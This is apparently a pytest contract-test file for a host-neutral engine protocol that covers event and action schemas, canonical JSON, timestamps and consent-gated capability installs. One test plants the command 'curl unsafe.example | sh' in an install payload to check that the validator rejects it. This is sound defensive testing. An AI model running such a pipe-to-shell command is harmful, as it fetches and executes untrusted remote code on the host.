"""Contract tests for the host-neutral CTX engine protocol."""

from __future__ import annotations

import json

import pytest

from ctx.engine import (
    ACTION_KINDS,
    EVENT_KINDS,
    PROTOCOL_VERSION,
    EngineEvent,
    HostAction,
    PrivacyLabel,
    ProtocolValidationError,
    ScopeRef,
    Transition,
    UnsupportedProtocolVersionError,
)
from ctx.engine.protocol import CANONICALIZATION_SCHEME


def _scope() -> ScopeRef:
    return ScopeRef(
        tenant_id="tenant-a",
        workspace_id="workspace-a",
        repository_id="repo-a",
        session_id="session-a",
        exposure_id="parent-agent",
        host_context_id="codex-thread-a",
    )


def _event(**overrides: object) -> EngineEvent:
    values: dict[str, object] = {
        "event_id": "evt-0001",
        "kind": "IntentObserved",
        "scope": _scope(),
        "expected_revision": 4,
        "occurred_at": "2026-08-01T12:00:00Z",
        "payload": {"task": "fix parser", "signals": ["python", "pytest"]},
        "privacy": PrivacyLabel(classification="private", retention="session"),
        "engine_version": "engine-v1",
        "planner_version": "planner-v1",
        "policy_version": "policy-v1",
        "host_descriptor_digest": "sha256:host",
        "catalog_snapshot_digest": "sha256:catalog",
        "semantic_model_digest": "sha256:model",
        "semantic_index_digest": "sha256:index",
        "work_signature": "sha256:work",
        "random_seed": 17,
        "correlation_id": "task-1",
        "causation_id": "evt-0000",
    }
    values.update(overrides)
    return EngineEvent(**values)  # type: ignore[arg-type]


def _physical_action(kind: str = "ActivateCapability", **overrides: object) -> HostAction:
    values: dict[str, object] = {
        "action_id": "act-0001",
        "kind": kind,
        "scope": _scope(),
        "precondition_revision": 5,
        "entity_id": "skill:python-debugger",
        "source_digest": "sha256:source",
        "plan_id": "plan-0001",
        "catalog_snapshot_id": "catalog-0001",
        "required_host_feature": "ephemeral-context",
        "verification": {"kind": "content-digest", "digest": "sha256:source"},
        "payload": {"reason": "current task needs Python debugging"},
        "privacy": PrivacyLabel(classification="private", retention="session"),
    }
    if kind in {"ActivateCapability", "PrepareExposure", "DeactivateCapability"}:
        values.update(
            lease_id="lease-0001",
            expires_at="2026-08-01T12:05:00Z",
        )
    values["rollback"] = {"kind": "restore", "entity_id": "skill:python-debugger"}
    if kind in {"InstallCapability", "UninstallCapability"}:
        values["consent_id"] = "consent-0001"
    if kind == "InstallCapability":
        values.update(
            required_host_feature="installation",
            payload={
                "install_plan_digest": "a" * 64,
                "install_descriptor_digest": "d" * 64,
                "installer_id": "ctx-install-actuator-v1",
                "installer_digest": "b" * 64,
                "policy_snapshot_digest": "c" * 64,
            },
            verification={"expected_state": "installed", "receipt_required": True},
        )
    values.update(overrides)
    return HostAction(**values)  # type: ignore[arg-type]


def test_scope_and_privacy_values_round_trip_canonically() -> None:
    scope = _scope()
    privacy = PrivacyLabel(classification="restricted", retention="ephemeral")

    assert ScopeRef.from_json(scope.to_json()) == scope
    assert PrivacyLabel.from_json(privacy.to_json()) == privacy
    assert scope.to_json() == json.dumps(
        scope.to_dict(), ensure_ascii=False, separators=(",", ":"), sort_keys=True
    )


def test_declared_event_and_action_kind_registries_are_complete() -> None:
    assert EVENT_KINDS == frozenset(
        {
            "SessionStarted",
            "WorkspaceObserved",
            "IntentObserved",
            "DevelopmentObserved",
            "TurnStarting",
            "ProviderSubmissionObserved",
            "ToolCallObserved",
            "ValidationObserved",
            "UserDecision",
            "InstallConsentExpired",
            "ActionApplied",
            "ActionFailed",
            "ActionExpired",
            "ReassessmentRequested",
            "TurnEnded",
            "SessionEnded",
        }
    )
    assert ACTION_KINDS == frozenset(
        {
            "PresentBundle",
            "RequestConsent",
            "InstallCapability",
            "ActivateCapability",
            "PrepareExposure",
            "PreparePromptContext",
            "DeactivateCapability",
            "UninstallCapability",
            "Notify",
            "NoChange",
        }
    )


def test_event_has_a_deterministic_canonical_round_trip_and_digests() -> None:
    event = _event()

    encoded = event.to_json()
    decoded = EngineEvent.from_json(encoded)

    assert decoded == event
    assert decoded.to_json() == encoded
    assert encoded == json.dumps(
        json.loads(encoded),
        ensure_ascii=False,
        separators=(",", ":"),
        sort_keys=True,
    )
    assert event.identity_digest == decoded.identity_digest
    assert event.content_digest == decoded.content_digest
    assert len(event.identity_digest) == 64
    assert len(event.content_digest) == 64
    assert CANONICALIZATION_SCHEME == "ctx-canonical-json-v1"


def test_same_event_identity_with_different_content_has_distinct_content_digest() -> None:
    original = _event(payload={"task": "fix parser"})
    collision = _event(payload={"task": "replace parser"})

    assert original.identity_digest == collision.identity_digest
    assert original.content_digest != collision.content_digest


def test_payload_is_defensively_frozen_after_validation() -> None:
    payload = {"nested": {"items": ["python"]}}
    event = _event(payload=payload)
    payload["nested"]["items"].append("mutation")  # type: ignore[index,union-attr]

    assert event.to_dict()["payload"] == {"nested": {"items": ["python"]}}


def test_action_and_transition_round_trip_canonically() -> None:
    action = _physical_action()
    transition = Transition(
        event_id="evt-0001",
        scope=_scope(),
        from_revision=4,
        to_revision=5,
        actions=(action,),
        diagnostics=({"code": "planner-ok"},),
    )

    decoded = Transition.from_json(transition.to_json())

    assert decoded == transition
    assert decoded.actions == (action,)
    assert decoded.to_json() == transition.to_json()


@pytest.mark.parametrize(
    ("factory", "match"),
    [
        (lambda: _event(kind="MadeUpEvent"), "event kind"),
        (
            lambda: HostAction(
                action_id="act-1",
                kind="MadeUpAction",
                scope=_scope(),
                precondition_revision=1,
            ),
            "action kind",
        ),
        (lambda: _event(expected_revision=-1), "expected_revision"),
        (lambda: _event(payload={"bad": float("nan")}), "finite"),
    ],
)
def test_invalid_protocol_values_are_rejected(factory: object, match: str) -> None:
    with pytest.raises(ProtocolValidationError, match=match):
        factory()  # type: ignore[operator]


def test_unknown_protocol_version_fails_on_construction_and_decode() -> None:
    with pytest.raises(UnsupportedProtocolVersionError, match="99"):
        _event(protocol_version=99)

    data = _event().to_dict()
    data["protocol_version"] = PROTOCOL_VERSION + 1
    with pytest.raises(UnsupportedProtocolVersionError):
        EngineEvent.from_dict(data)


@pytest.mark.parametrize(
    "kind",
    [
        "WorkspaceObserved",
        "IntentObserved",
        "DevelopmentObserved",
        "TurnStarting",
        "ValidationObserved",
        "ReassessmentRequested",
    ],
)
@pytest.mark.parametrize(
    "field_name",
    [
        "engine_version",
        "planner_version",
        "policy_version",
        "host_descriptor_digest",
        "catalog_snapshot_digest",
        "semantic_model_digest",
        "semantic_index_digest",
        "work_signature",
        "random_seed",
    ],
)
def test_decision_causing_events_require_frozen_replay_inputs(
    kind: str,
    field_name: str,
) -> None:
    with pytest.raises(ProtocolValidationError, match=field_name):
        _event(kind=kind, **{field_name: None})


def test_evidence_and_boundary_events_may_omit_planner_replay_inputs() -> None:
    omitted = {
        "engine_version": None,
        "planner_version": None,
        "policy_version": None,
        "host_descriptor_digest": None,
        "catalog_snapshot_digest": None,
        "semantic_model_digest": None,
        "semantic_index_digest": None,
        "work_signature": None,
        "random_seed": None,
    }

    for kind in (
        "SessionStarted",
        "ProviderSubmissionObserved",
        "ToolCallObserved",
        "TurnEnded",
        "SessionEnded",
    ):
        assert _event(kind=kind, **omitted).kind == kind


@pytest.mark.parametrize(
    ("value", "canonical"),
    [
        ("2026-08-01T12:00:00Z", "2026-08-01T12:00:00Z"),
        ("2026-08-01T12:00:00.1Z", "2026-08-01T12:00:00.1Z"),
        ("2026-08-01T12:00:00.120000Z", "2026-08-01T12:00:00.12Z"),
        ("2026-08-01T14:30:00+02:30", "2026-08-01T12:00:00Z"),
        ("2026-08-01T09:30:00-02:30", "2026-08-01T12:00:00Z"),
    ],
)
def test_rfc3339_timestamps_normalize_to_canonical_utc(
    value: str,
    canonical: str,
) -> None:
    assert _event(occurred_at=value).occurred_at == canonical
    assert _physical_action(expires_at=value).expires_at == canonical


@pytest.mark.parametrize(
    "value",
    [
        "2026-08-01 12:00:00Z",
        "2026-08-01X12:00:00Z",
        "2026-08-01T12:00Z",
        "2026-08-01T12:00:00",
        "2026-08-01T12:00:00z",
        "2026-08-01T12:00:00.1234567Z",
        "2026-08-01T12:00:00+02:30:15",
        "2026-02-30T12:00:00Z",
        "2026-08-01T12:00:60Z",
    ],
)
def test_noncanonical_or_invalid_rfc3339_timestamps_are_rejected(value: str) -> None:
    with pytest.raises(ProtocolValidationError, match="RFC 3339"):
        _event(occurred_at=value)


def test_transition_rejects_invalid_revision_ranges_and_action_scope() -> None:
    other_scope = ScopeRef(
        tenant_id="tenant-b",
        workspace_id="workspace-a",
        repository_id="repo-a",
        session_id="session-a",
        exposure_id="parent-agent",
        host_context_id="codex-thread-a",
    )
    action = HostAction(
        action_id="act-1",
        kind="Notify",
        scope=other_scope,
        precondition_revision=5,
        payload={"message": "repository changed"},
    )

    with pytest.raises(ProtocolValidationError, match="to_revision"):
        Transition(event_id="evt-1", scope=_scope(), from_revision=4, to_revision=3)
    with pytest.raises(ProtocolValidationError, match="scope"):
        Transition(
            event_id="evt-1",
            scope=_scope(),
            from_revision=4,
            to_revision=5,
            actions=(action,),
        )


def test_transition_is_one_committed_revision_and_actions_target_that_revision() -> None:
    action = _physical_action(precondition_revision=5)

    transition = Transition(
        event_id="evt-1",
        scope=_scope(),
        from_revision=4,
        to_revision=5,
        actions=(action,),
    )

    assert transition.to_revision == transition.from_revision + 1
    assert transition.actions[0].precondition_revision == transition.to_revision
    with pytest.raises(ProtocolValidationError, match="exactly one"):
        Transition(event_id="evt-1", scope=_scope(), from_revision=4, to_revision=6)
    with pytest.raises(ProtocolValidationError, match="committed.*to_revision"):
        Transition(
            event_id="evt-1",
            scope=_scope(),
            from_revision=4,
            to_revision=5,
            actions=(_physical_action(precondition_revision=4),),
        )


@pytest.mark.parametrize(
    "kind",
    [
        "InstallCapability",
        "ActivateCapability",
        "PrepareExposure",
        "DeactivateCapability",
        "UninstallCapability",
    ],
)
def test_physical_actions_require_exact_target_plan_and_verification(kind: str) -> None:
    action = _physical_action(kind)
    assert HostAction.from_json(action.to_json()) == action

    for field_name in (
        "entity_id",
        "source_digest",
        "plan_id",
        "catalog_snapshot_id",
        "required_host_feature",
        "verification",
    ):
        values = action.to_dict()
        values[field_name] = {} if field_name == "verification" else None
        with pytest.raises(ProtocolValidationError, match=field_name):
            HostAction.from_dict(values)


@pytest.mark.parametrize("kind", ["InstallCapability", "UninstallCapability"])
def test_persistent_mutations_require_exact_consent_and_rollback(kind: str) -> None:
    action = _physical_action(kind)
    for field_name in ("consent_id", "rollback"):
        values = action.to_dict()
        values[field_name] = {} if field_name == "rollback" else None
        with pytest.raises(ProtocolValidationError, match=field_name):
            HostAction.from_dict(values)


@pytest.mark.parametrize("kind", ["ActivateCapability", "DeactivateCapability"])
def test_other_physical_mutations_require_rollback(kind: str) -> None:
    values = _physical_action(kind).to_dict()
    values["rollback"] = {}

    with pytest.raises(ProtocolValidationError, match="rollback"):
        HostAction.from_dict(values)


def test_prepare_exposure_is_lease_bounded_and_has_cleanup_metadata() -> None:
    action = _physical_action("PrepareExposure")

    assert action.rollback
    for field_name in ("lease_id", "expires_at"):
        values = action.to_dict()
        values[field_name] = None
        with pytest.raises(ProtocolValidationError, match=field_name):
            HostAction.from_dict(values)

    values = action.to_dict()
    values["rollback"] = {}
    with pytest.raises(ProtocolValidationError, match="rollback"):
        HostAction.from_dict(values)


def test_request_consent_is_bound_to_one_persistent_action_digest() -> None:
    action = HostAction(
        action_id="ask-1",
        kind="RequestConsent",
        scope=_scope(),
        precondition_revision=5,
        entity_id="skill:python-debugger",
        source_digest="sha256:source",
        plan_id="plan-1",
        catalog_snapshot_id="catalog-1",
        consent_id="consent-1",
        required_host_feature="confirmation-ui",
        payload={
            "requested_action_id": "install-1",
            "requested_action_kind": "InstallCapability",
            "requested_action_content_digest": "a" * 64,
            "requested_action_precondition_revision": 6,
        },
    )
    assert HostAction.from_json(action.to_json()) == action

    values = action.to_dict()
    values["payload"]["requested_action_content_digest"] = "not-a-digest"
    with pytest.raises(ProtocolValidationError, match="requested_action_content_digest"):
        HostAction.from_dict(values)

    for field_name in ("requested_action_id", "requested_action_precondition_revision"):
        values = action.to_dict()
        values["payload"].pop(field_name)
        with pytest.raises(ProtocolValidationError, match=field_name):
            HostAction.from_dict(values)


@pytest.mark.parametrize("decision", ["granted", "denied"])
def test_user_decision_is_bound_to_one_exact_persistent_action(
    decision: str,
) -> None:
    event = _event(
        kind="UserDecision",
        expected_revision=5,
        payload={
            "consent_id": "consent-1",
            "decision": decision,
            "requested_action_id": "install-1",
            "requested_action_kind": "InstallCapability",
            "requested_action_content_digest": "a" * 64,
            "requested_action_precondition_revision": 6,
        },
    )

    assert EngineEvent.from_json(event.to_json()) == event


@pytest.mark.parametrize("decision_basis", ["interactive", "preapproved-policy"])
def test_install_decision_can_bind_durable_policy_provenance(decision_basis: str) -> None:
    event = _event(
        kind="UserDecision",
        expected_revision=5,
        payload={
            "consent_id": "consent-1",
            "decision": "granted",
            "decision_basis": decision_basis,
            "policy_snapshot_digest": "b" * 64,
            "requested_action_id": "install-1",
            "requested_action_kind": "InstallCapability",
            "requested_action_content_digest": "a" * 64,
            "requested_action_precondition_revision": 6,
        },
    )

    assert event.payload["decision_basis"] == decision_basis
    assert event.payload["policy_snapshot_digest"] == "b" * 64


def test_install_action_accepts_only_typed_plan_and_executor_identity() -> None:
    action = _physical_action("InstallCapability")
    assert action.required_host_feature == "installation"
    assert set(action.payload) == {
        "install_plan_digest",
        "install_descriptor_digest",
        "installer_id",
        "installer_digest",
        "policy_snapshot_digest",
    }
    values = action.to_dict()
    values["payload"]["command"] = "curl unsafe.example | sh"
    with pytest.raises(ProtocolValidationError, match="unknown field"):
        HostAction.from_dict(values)

    for field_name in (
        "install_plan_digest",
        "install_descriptor_digest",
        "installer_id",
        "installer_digest",
        "policy_snapshot_digest",
    ):
        values = action.to_dict()
        values["payload"].pop(field_name)
        with pytest.raises(ProtocolValidationError, match=field_name):
            HostAction.from_dict(values)

    values = action.to_dict()
    values["payload"]["install_descriptor_digest"] = "D" * 64
    with pytest.raises(ProtocolValidationError, match="install_descriptor_digest"):
        HostAction.from_dict(values)


def test_user_decision_rejects_missing_invalid_or_extra_discriminators() -> None:
    payload: dict[str, object] = {
        "consent_id": "consent-1",
        "decision": "granted",
        "requested_action_id": "install-1",
        "requested_action_kind": "InstallCapability",
        "requested_action_content_digest": "a" * 64,
        "requested_action_precondition_revision": 6,
    }
    for field_name in tuple(payload):
        invalid = dict(payload)
        invalid.pop(field_name)
        with pytest.raises(ProtocolValidationError, match=field_name):
            _event(kind="UserDecision", expected_revision=5, payload=invalid)

    for field_name, value in (
        ("decision", "maybe"),
        ("requested_action_kind", "ActivateCapability"),
        ("requested_action_content_digest", "not-sha256"),
        ("requested_action_precondition_revision", -1),
    ):
        invalid = {**payload, field_name: value}
        with pytest.raises(ProtocolValidationError, match=field_name):
            _event(kind="UserDecision", expected_revision=5, payload=invalid)

    with pytest.raises(ProtocolValidationError, match="unknown field"):
        _event(
            kind="UserDecision",
            expected_revision=5,
            payload={**payload, "surprise": True},
        )


def test_consent_flow_precomputes_the_next_revision_physical_action() -> None:
    install = _physical_action(
        "InstallCapability",
        action_id="install-1",
        precondition_revision=6,
        consent_id="consent-1",
    )
    requested_identity = {
        "requested_action_id": install.action_id,
        "requested_action_kind": install.kind,
        "requested_action_content_digest": install.content_digest,
        "requested_action_precondition_revision": install.precondition_revision,
    }
    consent_request = HostAction(
        action_id="ask-1",
        kind="RequestConsent",
        scope=_scope(),
        precondition_revision=5,
        entity_id=install.entity_id,
        source_digest=install.source_digest,
        plan_id=install.plan_id,
        catalog_snapshot_id=install.catalog_snapshot_id,
        consent_id=install.consent_id,
        required_host_feature="confirmation-ui",
        payload=requested_identity,
    )
    request_transition = Transition(
        event_id="intent-1",
        scope=_scope(),
        from_revision=4,
        to_revision=5,
        actions=(consent_request,),
    )
    decision = _event(
        event_id="decision-1",
        kind="UserDecision",
        expected_revision=5,
        payload={
            "consent_id": "consent-1",
            "decision": "granted",
            **requested_identity,
        },
    )
    apply_transition = Transition(
        event_id=decision.event_id,
        scope=_scope(),
        from_revision=5,
        to_revision=6,
        actions=(install,),
    )

    assert request_transition.actions[0].precondition_revision == 5
    assert decision.expected_revision == 5
    assert apply_transition.actions[0].precondition_revision == 6


@pytest.mark.parametrize("requested_revision", [5, 7])
def test_request_consent_rejects_stale_or_skipped_action_revision(
    requested_revision: int,
) -> None:
    values = HostAction(
        action_id="ask-1",
        kind="RequestConsent",
        scope=_scope(),
        precondition_revision=5,
        entity_id="skill:python-debugger",
        source_digest="sha256:source",
        plan_id="plan-1",
        catalog_snapshot_id="catalog-1",
        consent_id="consent-1",
        required_host_feature="confirmation-ui",
        payload={
            "requested_action_id": "install-1",
            "requested_action_kind": "InstallCapability",
            "requested_action_content_digest": "a" * 64,
            "requested_action_precondition_revision": 6,
        },
    ).to_dict()
    values["payload"]["requested_action_precondition_revision"] = requested_revision

    with pytest.raises(ProtocolValidationError, match="next committed revision"):
        HostAction.from_dict(values)


@pytest.mark.parametrize(
    ("decision_revision", "requested_revision"),
    [(5, 5), (5, 7), (6, 6)],
)
def test_user_decision_rejects_stale_skipped_or_intervening_revision(
    decision_revision: int,
    requested_revision: int,
) -> None:
    with pytest.raises(ProtocolValidationError, match="next committed revision"):
        _event(
            kind="UserDecision",
            expected_revision=decision_revision,
            payload={
                "consent_id": "consent-1",
                "decision": "granted",
                "requested_action_id": "install-1",
                "requested_action_kind": "InstallCapability",
                "requested_action_content_digest": "a" * 64,
                "requested_action_precondition_revision": requested_revision,
            },
        )


@pytest.mark.parametrize(
    ("kind", "kind_payload"),
    [
        ("ActionApplied", {"verification": {"host_state": "active"}}),
        ("ActionFailed", {"error": {"code": "host-rejected"}}),
        ("ActionExpired", {"reason": "expired"}),
    ],
)
def test_receipt_events_have_discriminated_exact_action_identity(
    kind: str,
    kind_payload: dict[str, object],
) -> None:
    action = _physical_action()
    payload: dict[str, object] = {
        "action_id": action.action_id,
        "action_kind": action.kind,
        "action_content_digest": action.content_digest,
        "action_precondition_revision": action.precondition_revision,
        **kind_payload,
    }
    receipt = _event(
        event_id=f"receipt-{kind}",
        kind=kind,
        expected_revision=action.precondition_revision,
        payload=payload,
    )

    assert EngineEvent.from_json(receipt.to_json()) == receipt
    for field_name in (
        "action_id",
        "action_kind",
        "action_content_digest",
        "action_precondition_revision",
    ):
        invalid = dict(payload)
        invalid.pop(field_name)
        with pytest.raises(ProtocolValidationError, match=field_name):
            _event(kind=kind, payload=invalid)


def test_receipt_event_rejects_wrong_discriminator_and_unknown_receipt_field() -> None:
    payload = {
        "action_id": "act-1",
        "action_kind": "NotAnAction",
        "action_content_digest": "0" * 64,
        "action_precondition_revision": 5,
        "verification": {"host_state": "active"},
    }
    with pytest.raises(ProtocolValidationError, match="action_kind"):
        _event(kind="ActionApplied", payload=payload)

    payload["action_kind"] = "ActivateCapability"
    payload["surprise"] = True
    with pytest.raises(ProtocolValidationError, match="unknown field"):
        _event(kind="ActionApplied", payload=payload)

    payload.pop("surprise")
    payload["action_kind"] = {"not": "a string"}
    with pytest.raises(ProtocolValidationError, match="action_kind"):
        _event(kind="ActionApplied", payload=payload)


def test_receipt_evidence_rejects_raw_or_free_form_host_content() -> None:
    identity = {
        "action_id": "act-1",
        "action_kind": "PrepareExposure",
        "action_content_digest": "0" * 64,
        "action_precondition_revision": 5,
    }

    with pytest.raises(ProtocolValidationError, match="unknown field"):
        _event(
            kind="ActionApplied",
            payload={
                **identity,
                "verification": {
                    "host_state": "prepared",
                    "raw_content": "SECRET-SENTINEL",
                },
            },
        )
    with pytest.raises(ProtocolValidationError, match="unknown field"):
        _event(
            kind="ActionFailed",
            payload={
                **identity,
                "error": {"code": "host-failure", "detail": "SECRET-SENTINEL"},
            },
        )
    with pytest.raises(ProtocolValidationError, match="must be expired"):
        _event(
            kind="ActionExpired",
            payload={**identity, "reason": "SECRET-SENTINEL"},
        )


@pytest.mark.parametrize(
    ("kind", "payload", "missing_field"),
    [
        (
            "ActionApplied",
            {
                "action_id": "act-1",
                "action_kind": "ActivateCapability",
                "action_content_digest": "0" * 64,
                "action_precondition_revision": 5,
            },
            "verification",
        ),
        (
            "ActionFailed",
            {
                "action_id": "act-1",
                "action_kind": "ActivateCapability",
                "action_content_digest": "0" * 64,
                "action_precondition_revision": 5,
            },
            "error",
        ),
        (
            "ActionExpired",
            {
                "action_id": "act-1",
                "action_kind": "ActivateCapability",
                "action_content_digest": "0" * 64,
                "action_precondition_revision": 5,
            },
            "reason",
        ),
    ],
)
def test_each_receipt_kind_requires_its_own_evidence(
    kind: str,
    payload: dict[str, object],
    missing_field: str,
) -> None:
    with pytest.raises(ProtocolValidationError, match=missing_field):
        _event(kind=kind, payload=payload)


@pytest.mark.parametrize(
    "factory",
    [
        lambda: _event(event_id="bad\ud800id"),
        lambda: _event(payload={"nested": "bad\udfffvalue"}),
        lambda: ScopeRef.from_json(
            '{"tenant_id":"bad\\ud800","workspace_id":"w","repository_id":"r",'
            '"session_id":"s","exposure_id":"e","host_context_id":"h",'
            '"parent_exposure_id":null}'
        ),
    ],
)
def test_unpaired_unicode_surrogates_always_raise_protocol_error(factory: object) -> None:
    with pytest.raises(ProtocolValidationError, match="Unicode scalar"):
        factory()  # type: ignore[operator]


def test_json_decoder_rejects_duplicate_keys_at_every_depth() -> None:
    encoded = _event().to_json()
    duplicate_root = encoded[:-1] + ',"event_id":"evt-shadow"}'
    with pytest.raises(ProtocolValidationError, match="duplicate JSON key.*event_id"):
        EngineEvent.from_json(duplicate_root)

    duplicate_nested = encoded.replace(
        '"payload":{"signals"',
        '"payload":{"task":"duplicate","signals"',
    )
    with pytest.raises(ProtocolValidationError, match="duplicate JSON key.*task"):
        EngineEvent.from_json(duplicate_nested)


@pytest.mark.parametrize(
    ("decoder", "value"),
    [
        (ScopeRef.from_dict, lambda: {**_scope().to_dict(), "surprise": True}),
        (
            PrivacyLabel.from_dict,
            lambda: {**PrivacyLabel().to_dict(), "surprise": True},
        ),
        (EngineEvent.from_dict, lambda: {**_event().to_dict(), "surprise": True}),
        (
            HostAction.from_dict,
            lambda: {**_physical_action().to_dict(), "surprise": True},
        ),
        (
            Transition.from_dict,
            lambda: {
                **Transition(
                    event_id="evt-1",
                    scope=_scope(),
                    from_revision=4,
                    to_revision=5,
                ).to_dict(),
                "surprise": True,
            },
        ),
    ],
)
def test_all_decoders_reject_unknown_envelope_fields(decoder: object, value: object) -> None:
    with pytest.raises(ProtocolValidationError, match="unknown field.*surprise"):
        decoder(value())  # type: ignore[operator]


def test_transition_decoder_requires_scope_and_object_keys_must_be_strings() -> None:
    transition = Transition(
        event_id="evt-1",
        scope=_scope(),
        from_revision=4,
        to_revision=5,
    ).to_dict()
    transition.pop("scope")
    with pytest.raises(ProtocolValidationError, match="missing scope"):
        Transition.from_dict(transition)

    invalid_scope: dict[object, object] = {key: value for key, value in _scope().to_dict().items()}
    invalid_scope[1] = "surprise"
    invalid_scope["surprise"] = True
    with pytest.raises(ProtocolValidationError):
        ScopeRef.from_dict(invalid_scope)  # type: ignore[arg-type]
